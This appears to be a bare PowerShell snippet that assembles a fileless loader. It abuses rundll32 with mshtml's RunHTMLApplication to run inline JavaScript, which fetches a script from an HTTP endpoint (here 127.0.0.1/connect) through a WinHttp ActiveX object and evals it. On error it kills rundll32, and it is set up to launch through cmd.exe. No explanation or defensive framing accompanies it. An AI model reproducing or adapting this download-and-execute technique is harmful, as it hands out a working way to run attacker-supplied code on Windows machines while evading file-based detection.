$a="rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";document.write();h=new%20ActiveXObject(`"WinHttp.WinHttpRequest.5.1`");h.Open(`"GET`",`"http://127.0.0.1/connect`",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(`"WScript.Shell`").Run(`"cmd /c taskkill /f /im rundll32.exe`",0,true);}"
$msexe="cmd.exe"
$arguments="/c $a"
